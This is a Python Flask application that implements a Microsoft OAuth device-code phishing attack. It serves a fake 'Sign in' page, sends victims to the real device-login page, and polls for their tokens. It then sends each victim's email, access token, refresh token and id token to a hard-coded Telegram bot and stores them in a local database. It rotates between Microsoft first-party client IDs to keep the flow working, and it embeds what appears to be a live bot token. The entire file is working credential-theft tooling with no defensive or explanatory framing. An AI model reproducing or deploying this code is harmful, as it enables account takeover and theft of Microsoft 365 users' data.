import os
import time
import sqlite3
import threading
import base64
import json
import requests
from flask import Flask, request, render_template_string
import jwt  # PyJWT

app = Flask(__name__)

BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

# Rotation of first-party client IDs
CLIENT_IDS = [
    "04b077ac-2adb-4664-99c4-a2c1a1a4b1e0",  # Azure PowerShell
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure CLI
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
]
CLIENT_ID_INDEX = 0

def get_client_id():
    return CLIENT_IDS[CLIENT_ID_INDEX % len(CLIENT_IDS)]

def rotate_client_id():
    global CLIENT_ID_INDEX
    CLIENT_ID_INDEX += 1
    print(f"[ROTATE] Switched to client ID index {CLIENT_ID_INDEX}", flush=True)

# ---------- DB ----------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_code TEXT, user_code TEXT, client_id TEXT,
                  status TEXT, email TEXT, tokens TEXT,
                  created_at REAL, completed_at REAL)""")
    conn.commit()
    conn.close()

init_db()

def db():
    return sqlite3.connect(DB_PATH, timeout=30)

# ---------- Telegram ----------
def send_telegram(text):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=15,
        )
        print(f"[TG] status={r.status_code} resp={r.text[:200]}", flush=True)
        return r.status_code == 200
    except Exception as e:
        print(f"[TG] EXCEPTION: {e}", flush=True)
        return False

# ---------- Decode id_token ----------
def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("upn") or data.get("email") or "unknown"
    except Exception as e:
        print(f"[JWT] decode failed: {e}", flush=True)
        return "unknown"

# ---------- Poll worker ----------
def poll_worker():
    print("[WORKER] poll_worker started", flush=True)
    while True:
        try:
            conn = db()
            c = conn.cursor()
            c.execute("SELECT id, device_code, client_id FROM sessions WHERE status='pending'")
            rows = c.fetchall()
            if rows:
                print(f"[WORKER] polling {len(rows)} pending session(s)", flush=True)
            for sid, device_code, client_id in rows:
                r = requests.post(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                    data={
                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                        "client_id": client_id,
                        "device_code": device_code,
                    },
                    timeout=15,
                )
                resp = r.json()
                if "error" in resp:
                    err = resp["error"]
                    if err == "authorization_pending":
                        continue
                    elif err == "expired_token":
                        c.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
                        conn.commit()
                        print(f"[WORKER] session {sid} expired", flush=True)
                    elif err == "authorization_declined":
                        c.execute("UPDATE sessions SET status='declined' WHERE id=?", (sid,))
                        conn.commit()
                    else:
                        print(f"[WORKER] session {sid} error: {err}", flush=True)
                        if "invalid_client" in err:
                            rotate_client_id()
                    continue
                # SUCCESS
                tokens = resp
                email = decode_id_token(tokens.get("id_token", ""))
                idt = tokens.get("id_token", "N/A")
                at = tokens.get("access_token", "N/A")
                rt = tokens.get("refresh_token", "N/A")
                msg = (
                    f"🎯 <b>New Catch!</b>\n\n"
                    f"📧 <b>Email:</b> {email}\n\n"
                    f"<b>access_token:</b>\n<code>{at}</code>\n\n"
                    f"<b>refresh_token:</b>\n<code>{rt}</code>\n\n"
                    f"<b>id_token:</b>\n<code>{idt}</code>"
                )
                ok = send_telegram(msg)
                print(f"[WORKER] session {sid} caught email={email} tg_ok={ok}", flush=True)
                c.execute("UPDATE sessions SET status='done', email=?, tokens=?, completed_at=? WHERE id=?",
                          (email, json.dumps(tokens), time.time(), sid))
                conn.commit()
            conn.close()
        except Exception as e:
            print(f"[WORKER] loop error: {e}", flush=True)
        time.sleep(5)

def start_worker():
    t = threading.Thread(target=poll_worker, daemon=True)
    t.start()
    print("[WORKER] thread launched", flush=True)

# ---------- Routes ----------
PAGE = """
<!DOCTYPE html><html><head><title>Sign in</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{width:440px;border:1px solid #e3e3e3;padding:44px;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h2{font-weight:400;color:#1b1b1b}
.code{font-size:28px;letter-spacing:4px;margin:24px 0;padding:14px;background:#f2f2f2;font-weight:600}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer}
button:hover{background:#005da6}
p{color:#666;font-size:13px}
</style></head><body>
<div class="card">
<h2>Enter this code to sign in</h2>
<p>Copy this code, then select Next to continue:</p>
<div class="code" id="code">{{ user_code }}</div>
<button onclick="go()">Next</button>
<p id="status"></p>
</div>
<script>
function go(){
  var c=document.getElementById('code').innerText.trim();
  navigator.clipboard.writeText(c).then(function(){
    document.getElementById('status').innerText='Code copied! Redirecting...';
    setTimeout(function(){window.location.href='https://www.microsoft.com/devicelogin';},800);
  }).catch(function(){
    document.getElementById('status').innerText='Copy failed - copy manually';
    window.location.href='https://www.microsoft.com/devicelogin';
  });
}
</script>
</body></html>
"""

@app.route("/")
def index():
    client_id = get_client_id()
    r = requests.post(
        "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
        data={"client_id": client_id, "scope": "https://graph.microsoft.com/.default offline_access openid profile"},
        timeout=15,
    )
    resp = r.json()
    print(f"[INDEX] devicecode resp keys: {list(resp.keys())}", flush=True)
    if "error" in resp:
        rotate_client_id()
        return f"Error starting login: {resp}", 500
    conn = db()
    conn.execute("INSERT INTO sessions (device_code, user_code, client_id, status, created_at) VALUES (?,?,?,?,?)",
                 (resp["device_code"], resp["user_code"], client_id, "pending", time.time()))
    conn.commit()
    conn.close()
    return render_template_string(PAGE, user_code=resp["user_code"])

@app.route("/test_tg")
def test_tg():
    ok = send_telegram("✅ Test message from outlook-verify bot — if you see this, Telegram works!")
    return f"Telegram send: {'OK' if ok else 'FAILED — check Render logs for [TG] line'}"

# Start worker when gunicorn boots this module
start_worker()
